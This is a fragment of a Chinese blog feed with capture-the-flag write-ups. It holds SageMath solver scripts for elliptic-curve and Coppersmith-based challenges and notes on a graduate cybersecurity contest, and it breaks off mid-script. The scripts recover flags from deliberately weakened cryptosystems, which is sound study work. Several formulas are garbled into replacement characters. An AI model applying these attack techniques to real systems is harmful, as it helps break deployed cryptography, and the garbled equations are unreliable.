number\">101202160159081561029549739902097099275439197324107563340103725793005952286427</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">77352628233208904456190113484930965015529164818065903310716894212030514274681</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>g <span class=\"token operator\">=</span> <span class=\"token number\">60481606253840272416608492349866939317114665311741132450767745324720776050313</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'output.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    G <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    Q <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    leak <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Qpp <span class=\"token operator\">=</span> Qp<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> prec<span class=\"token operator\">=</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>s2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>Qpp<span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> Qpp<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>lift<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> G<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> a<span class=\"token operator\">*</span>G<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p<span class=\"token operator\">^</span><span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Fp5 <span class=\"token operator\">=</span> Zmod<span class=\"token punctuation\">(</span>p<span class=\"token operator\">^</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>E <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>Fp5<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p_ord <span class=\"token operator\">=</span> E<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>order<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>EQp <span class=\"token operator\">=</span> E<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>Qp<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>QpG <span class=\"token operator\">=</span> EQp<span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> p_ord</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>QpQ <span class=\"token operator\">=</span> EQp<span class=\"token punctuation\">(</span>Q<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> p_ord</pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>phiG <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>QpG<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">/</span> QpG<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>phiQ <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>QpQ<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">/</span> QpQ<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>s1 <span class=\"token operator\">=</span> ZZ<span class=\"token punctuation\">(</span>phiQ <span class=\"token operator\">/</span> phiG<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"magic_ecc\"><a class=\"markdownIt-Anchor\" href=\"#magic_ecc\">#</a> magic_ecc</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">7834852404690613421430169663612203646364286385985089874202019066309609197617451690988793560462179054987116479700769830549608039683656465594954511680417439827884682514137395099618980184523220683344996556134367140942117294093697944691881733841814807163442986266436501188979024846961439278137438956993286762327</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56294620872968718380397963653042708970679997991074373308327166468889019728428695832974471693865711660199765275543574607777072876711036238547682259596299830777636017508061107901637637285281716996357267778844219142268259492772365960388947511378141363201796810931407918179374553857261098454741363722931008506489</span><span class=\"token punctuation\">,</span> <span class=\"token number\">129957982988172364798440102561140523140644973971267372222458834449933213209554347296288675182049584297578956734950355730140774286965046426714693180361079049463593214844598178841579717839460125946223610814809560801920675773424029429584993267487434123215947150197664528709696606034737478716163854006621716785991</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9066055260883591502053070869551945047692654206920946891326048741423436599435774484763722715368827203845612354403468594494511688795068051140777669329826790833884137019297335832118519149000495203691914082887641717032244953119788416874814325467577437200429867014461247963978079935867875238778711836684201288629</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">7048154001918995017477365250721440939846406590540353416820154008187139217962602433154255479524221017573932812808705559493957586212577760267599598714536291727239485215656286274781121306887482105659998955359830778419337539924176135760285232988635633360704580265662170937825877189245474738393021110026742102153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31321627825577613037613808260049947007597426398894543343295026929881402452208952913568802715190246106852599964881281443228975390464866025563219146668773014384534545192472026458279658043212752646582216269356048760074676973727755420979369317926774191804078299545532996426124351002568625497764155513252011538383</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100376678530410393440129444794028270589837686585546722960835863526622361668168592119632678982588964433092332436582055706812912246068983186060549127456588081281709747489416102968621180956752592139190805283441881388281289967907267811700783042913976898959346128092682283410576618008749415379182268334407914148254</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6943832903409991642828570302536131525128645753930793106382906368952726384077421186255403537931046135925451476048548017535373288933816332713598232518007018014021815609935851599706943287432440225704733070091400716880400394526448257123585228314673632971354933209639455109919401694778978191398135174777533045403</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4272068648071168554128636586350467405009694241694262836849423155558524145309230653833900842480890062328504409347247873131227928999434917761846296010735220794539754754709781832591462658606731823437811260960368913997315971957378706774967707190047218973326733836134154328499864695789950910713523349012474450864</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11929895073032022513957831520065553727240314640963946035392521145067403043568103057789780858770584336171401618656230002952248952501656323696171128964091972452983219532076399819635525501541575635759478775528763593811199873333060757002721704633920964694387555113420556152094378726220099897441805429281932182249</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103479492760868255868822251568430728660153846040468623291049762149835619268304116069175027462824325373424329188452060129997748026322908351085116208712488124073324734412873332262218458728286795171892582854096835272404670621882642310331656668706237434350806299564270634718815297722496881546541557249523300668419</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7649214589736145661339350025603766052029302867406177205198200412263344904792642202923484806907193137271787655081123837667924783972976687435768372148142019805960085696461852811862193410065098094960702563602088132165333080687485869630334541488910322456467515098185301836641936447884084214487374441279192233849</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4806088655232032640131815968035322182275006692259183095737832095267524825650586709163929120708376642687256768447965710629080349200588181928595678047040880789724971817059358396163096713153272213427522822058891798994246279675546478741928529988967946204452767371906673286827596885891268683555890521866220464996</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36427308113569747526874637238611956674658176451423982942908576371079856193061929116763841738289478269762767309956202920564091203721624520590467722449528903731839566008139942787078693680673776528179554827688651298887826999553050429188191123121557929147839173277183786286467590000199719564184235204795732718072</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22671172019607699010808242481239740857130309731255435371908887956593421434992512079790234625706350568447858868609783480724200167840452748080516811720426420974312708628131116060025172282266118472961472876873141994049733918908550242475246834408823242506072794063563809180873166212417405862218538966602792514167</span><span class=\"token punctuation\">,</span> <span class=\"token number\">644361727747632626598826890581163999609668835723437298040290901674278545143549378125708738964569230174723374335762192451734784904542916232268939865691930798231529455733298867239440319451124463937678028231210599360468666533601195511935168705936295829890653739823139986804039319543460282204539256406399080821</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">F_</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    P<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    f <span class=\"token operator\">=</span> y<span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>x0<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span>a<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>x0<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> b</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> f</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>x0 <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span><span class=\"token string\">b'flag&#123;'</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>N <span class=\"token operator\">=</span> prod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'brute force'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>time <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">for</span> i1 <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">for</span> i2 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">for</span> i3 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">for</span> i4 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                f1 <span class=\"token operator\">=</span> F_<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>i1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                f2 <span class=\"token operator\">=</span> F_<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>i1<span class=\"token operator\">+</span>i2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                f3 <span class=\"token operator\">=</span> F_<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>i1<span class=\"token operator\">+</span>i2<span class=\"token operator\">+</span>i3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                f4 <span class=\"token operator\">=</span> F_<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>i1<span class=\"token operator\">+</span>i2<span class=\"token operator\">+</span>i3<span class=\"token operator\">+</span>i4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                fs <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>f1<span class=\"token punctuation\">,</span>f2<span class=\"token punctuation\">,</span>f3<span class=\"token punctuation\">,</span>f4<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                F <span class=\"token operator\">=</span> crt<span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                FF <span class=\"token operator\">=</span> F<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                roots <span class=\"token operator\">=</span> FF<span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>X<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">984</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>分类: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvY2F0ZWdvcnkvMjIwMjk5Ny5odG1s\">WriteUp</span></p>\n<p>标签: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL2NyeXB0by8=\">crypto</span> , <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL3dyaXRldXAv\">writeup</span></p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/",
            "url": "http://waltcsz.github.io/2023/12/",
            "title": "",
            "date_published": "2023-12-05T15:25:17.905Z",
            "content_html": "<h1 id=\"华为杯第二届中国研究生网络安全创新大赛\"><a class=\"markdownIt-Anchor\" href=\"#华为杯第二届中国研究生网络安全创新大赛\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvYXJ0aWNsZXMvMTc3MzUxNTQuaHRtbA==\"> “华为杯” 第二届中国研究生网络安全创新大赛 </span></h1>\n<p>初赛，和学弟打了个第二，没做到很难的题目。</p>\n<h2 id=\"一个小秘密\"><a class=\"markdownIt-Anchor\" href=\"#一个小秘密\">#</a> 一个小秘密</h2>\n<p>提示说：除了 base64 还有什么编码 MFZWIYLEMFSA====<br>\n 尝试 base32 解密：</p>\n<p><img data-src=\"https://img2023.cnblogs.com/blog/2902310/202309/2902310-20230928102610608-774496025.png\" alt=\"image\"><br>\nasdadad 作为解压密码可以解开压缩包，里面有个 txt 文件，稍微看一下可以找到 PK 头，也可以看到 xml 文件，因此可知是 word 文件，所以直接改为 zip 后缀解压，在 document.xml 里面可以找到一串 U2F 开头的密文，可以找到这个密文相应的网站，尝试 aes 解密，再最后解 base64 即可</p>\n<p><img data-src=\"https://img2023.cnblogs.com/blog/2902310/202309/2902310-20230928102636120-106552405.png\" alt=\"image\"></p>\n<h2 id=\"stepbystep\"><a class=\"markdownIt-Anchor\" href=\"#stepbystep\">#</a> StepBystep</h2>\n<ol>\n<li></li>\n</ol>\n<p>由于 <code>y = p ^ (bytes_to_long(part1) &lt;&lt; 0x100)</code> ，我们已知 p 的高位和低位比特，只有中间那部分与 part1 异或的是未知的。而我们知道未知比特长度为 32x8，那么方程可建立为:</p>\n<p>�ℎ⋅2232+32∗8+�⋅2256+��≡0����</p>\n<p>利用 coppersmith 即可解出 x 并恢复 p。<br>\n得到 p 之后可以通过异或和移位操作还原 part1.</p>\n<p>2. 通过二次剩余判定来还原 part2。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">bit_enc</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    enc <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    m <span class=\"token operator\">=</span> <span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> m<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            r <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">if</span> GCD<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                enc<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>k <span class=\"token operator\">**</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> r <span class=\"token operator\">**</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> enc</pre></td></tr></table></figure><p>函数对 m 的每一比特进行加密，若比特为 0，则返回�2����，否则返回�.�2����。<br>\n因为 k 是模 p 的二次非剩余，可以对每一组密文在模 p 下进行二次剩余判定，若为二次剩余，则说明该密文对应的比特为 0，反之成立。对二次剩余的判定，可以利用 sage 集成的函数 kronecker：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> cc <span class=\"token keyword\">in</span> enc1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    t <span class=\"token operator\">=</span> cc<span class=\"token operator\">%</span>p</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> kronecker<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        m2 <span class=\"token operator\">=</span> m2 <span class=\"token operator\">+</span><span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        m2 <span class=\"token operator\">=</span> m2 <span class=\"token operator\">+</span><span class=\"token string\">'0'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>m2 <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>3. 根据题目，有以下关系：</p>\n<p>�=������3����=���2</p>\n<p>利用其建立 coppersmith 的方程。设�=��+�，有 (��+�) 3−���2≡0����，copper 求 k 再解 m 即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>kbits <span class=\"token operator\">=</span> <span class=\"token number\">200</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>P<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>M <span class=\"token operator\">+</span> r<span class=\"token operator\">*</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>e <span class=\"token operator\">-</span> enc2</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>f<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 